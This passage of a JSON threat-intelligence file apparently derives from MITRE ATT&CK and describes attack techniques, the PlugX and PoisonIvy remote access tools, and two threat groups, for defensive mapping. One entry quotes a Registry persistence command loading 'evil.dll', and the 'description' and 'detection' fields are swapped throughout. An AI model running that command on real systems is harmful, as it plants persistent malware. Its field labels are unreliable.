                    "T1550.002": "Pass the Hash",
                    "T1548.002": "Bypass User Account Control",
                    "T1543.003": "Windows Service",
                    "T1055.012": "Process Hollowing",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1137.001": "Office Template Macros",
                    "T1197": "BITS Jobs",
                    "T1203": "Exploitation for Client Execution",
                    "T1185": "Man in the Browser",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1135": "Network Share Discovery",
                    "T1113": "Screen Capture",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1071": "Application Layer Protocol",
                    "T1068": "Exploitation for Privilege Escalation",
                    "T1057": "Process Discovery",
                    "T1055": "Process Injection",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1046": "Network Service Scanning",
                    "T1043": "Commonly Used Port",
                    "T1029": "Scheduled Transfer",
                    "T1027": "Obfuscated Files or Information",
                    "T1026": "Multiband Communication",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1005": "Data from Local System"
                }
            },
            "val": 60
        },
        {
            "id": "T1127.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "MSBuild",
                "chain_phase": "defense-evasion",
                "description": "Use process monitoring to monitor the execution and arguments of MSBuild.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.",
                "detection": "Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.\n\nAdversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file. MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1102.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Dead Drop Resolver",
                "chain_phase": "command-and-control",
                "description": "Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1574.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "DLL Side-Loading",
                "chain_phase": "persistence",
                "description": "Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so) as well as the introduction of new files/programs. Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.",
                "detection": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1497.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Checks",
                "chain_phase": "defense-evasion",
                "description": "Virtualization/sandbox related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.",
                "detection": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. \n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. \n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1036.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Masquerade Task or Service",
                "chain_phase": "defense-evasion",
                "description": "Look for changes to tasks and services that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks or services may show up as outlier processes that have not been seen before when compared against historical data. Monitor processes and command-line arguments for actions that could be taken to create tasks or services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
                "detection": "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1547.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Registry Run Keys / Startup Folder",
                "chain_phase": "persistence",
                "description": "Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
                "detection": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.  These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.  For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1094",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Custom Command and Control Protocol",
                "chain_phase": null,
                "description": [],
                "detection": "No Description Available Yet",
                "is_subtype": false,
                "platforms": []
            }
        },
        {
            "id": "T1083",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "File and Directory Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.  Custom tools may also be used to gather file and directory information and interact with the Native API.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0013",
            "type": "tool",
            "attributes": {
                "name": "PlugX",
                "aliases": [
                    "DestroyRAT",
                    "Sogu",
                    "Kaba",
                    "Korplug"
                ],
                "labels": [
                    "malware"
                ],
                "description": "PlugX is a remote access tool (RAT) that uses modular plugins. It has been used by multiple threat groups.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1127.001": "MSBuild",
                    "T1071.004": "DNS",
                    "T1071.001": "Web Protocols",
                    "T1102.001": "Dead Drop Resolver",
                    "T1574.002": "DLL Side-Loading",
                    "T1059.003": "Windows Command Shell",
                    "T1497.001": "System Checks",
                    "T1056.001": "Keylogging",
                    "T1036.004": "Masquerade Task or Service",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1135": "Network Share Discovery",
                    "T1113": "Screen Capture",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1094": "Custom Command and Control Protocol",
                    "T1083": "File and Directory Discovery",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1043": "Commonly Used Port",
                    "T1026": "Multiband Communication",
                    "T1012": "Query Registry"
                }
            },
            "val": 25
        },
        {
            "id": "T1547.014",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Active Setup",
                "chain_phase": "persistence",
                "description": "Monitor Registry key additions and/or modifications to <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code>.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the Active Setup Registry locations and startup folders.(Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.",
                "detection": "Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nAdversaries may abuse Active Setup by creating a key under <code> HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer.\n\nAdversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1074.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Local Data Staging",
                "chain_phase": "collection",
                "description": "Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1065",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Uncommonly Used Port",
                "chain_phase": null,
                "description": [],
                "detection": "No Description Available Yet",
                "is_subtype": false,
                "platforms": []
            }
        },
        {
            "id": "T1014",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Rootkit",
                "chain_phase": "defense-evasion",
                "description": "Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR. (Citation: Wikipedia Rootkit)",
                "detection": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information.  \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or System Firmware.  Rootkits have been seen for Windows, Linux, and Mac OS X systems.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1010",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Application Window Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.",
                "is_subtype": false,
                "platforms": [
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0012",
            "type": "tool",
            "attributes": {
                "name": "PoisonIvy",
                "aliases": [
                    "Poison Ivy",
                    "Darkmoon"
                ],
                "labels": [
                    "malware"
                ],
                "description": "PoisonIvy is a popular remote access tool (RAT) that has been used by many groups.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1547.014": "Active Setup",
                    "T1573.001": "Symmetric Cryptography",
                    "T1074.001": "Local Data Staging",
                    "T1059.003": "Windows Command Shell",
                    "T1056.001": "Keylogging",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1065": "Uncommonly Used Port",
                    "T1027": "Obfuscated Files or Information",
                    "T1014": "Rootkit",
                    "T1010": "Application Window Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 15
        },
        {
            "id": "G0128",
            "type": "group",
            "attributes": {
                "val": 0,
                "name": "ZIRCONIUM",
                "aliases": [
                    "APT31"
                ],
                "description": "ZIRCONIUM is a threat group operating out of China, active since at least 2017, that has targeted individuals associated with the 2020 US presidential election and prominent leaders in the international affairs community.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": [],
                "techniques": {
                    "T1598": "Phishing for Information",
                    "T1583.006": "Web Services",
                    "T1583.001": "Domains",
                    "T1573.001": "Symmetric Cryptography",
                    "T1102.002": "Bidirectional Communication",
                    "T1204.001": "Malicious Link",
                    "T1567.002": "Exfiltration to Cloud Storage",
                    "T1059.006": "Python",
                    "T1059.003": "Windows Command Shell",
                    "T1566.002": "Spearphishing Link",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1036.004": "Masquerade Task or Service",
                    "T1027.002": "Software Packing",
                    "T1218.007": "Msiexec",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1124": "System Time Discovery",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1068": "Exploitation for Privilege Escalation",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1036": "Masquerading",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry"
                }
            }
        },
        {
            "id": "G0127",
            "type": "group",
            "attributes": {
                "val": 3,
                "name": "TA551",
                "aliases": [
                    "GOLD CABIN",
                    "Shathak"
                ],
                "description": "TA551 is a financially-motivated threat group that has been active since at least 2018.  The group has primarily targeted English, German, Italian, and Japanese speakers through email-based malware distribution campaigns.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0483": "IcedID",
                    "S0476": "Valak",
                    "S0386": "Ursnif"
                },
                "techniques": {
                    "T1589.002": "Email Addresses",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1204.002": "Malicious File",
                    "T1568.002": "Domain Generation Algorithms",
                    "T1059.003": "Windows Command Shell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1027.003": "Steganography",
                    "T1218.010": "Regsvr32",
                    "T1218.005": "Mshta",
                    "T1218.011": "Rundll32",
                    "T1105": "Ingress Tool Transfer",
                    "T1036": "Masquerading",
                    "T1027": "Obfuscated Files or Information"
                }
            }
        },
        {
            "id": "T1204.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Malicious File",
                "chain_phase": "execution",
                "description": "Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).",
                "detection": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading on the file to increase the likelihood that a user will open it.\n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1566.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Spearphishing Attachment",
                "chain_phase": "initial-access",
                "description": "Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nAnti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.\n\nMonitor for suspicious descendant process spawning from Microsoft Office and other productivity software.(Citation: Elastic - Koadiac Detection with EQL)",
                "detection": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
                "is_subtype": true,
                "platforms": [
                    "macOS",
                    "Windows",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1027.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Steganography",
                "chain_phase": "defense-evasion",
                "description": "Detection of steganography is difficult unless artifacts are left behind by the obfuscation process that are detectable with a known signature. Look for strings are other signatures left in system artifacts related to decoding steganography.",
                "detection": "Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\n\nDuqu was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server. \n\nBy the end of 2017, a threat group used <code>Invoke-PSImage</code> to hide PowerShell commands in an image file (.png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1027.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Software Packing",
                "chain_phase": "defense-evasion",
                "description": "Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.",
                "detection": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available,  but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.",
                "is_subtype": true,
                "platforms": [
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1218.007",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Msiexec",
                "chain_phase": "defense-evasion",
                "description": "Use process monitoring to monitor the execution and arguments of msiexec.exe. Compare recent invocations of msiexec.exe with prior history of known good arguments and executed MSI files or DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of msiexec.exe may also be useful in determining the origin and purpose of the MSI files or DLLs being executed.",
                "detection": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi). Msiexec.exe is digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs. Since it is signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1055.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Asynchronous Procedure Call",
                "chain_phase": "defense-evasion",
                "description": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",
                "detection": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \n\nAPC injection is commonly performed by attaching malicious code to the APC Queue  of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL). \n\nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC.  AtomBombing  is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1053.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Scheduled Task",
                "chain_phase": "execution",
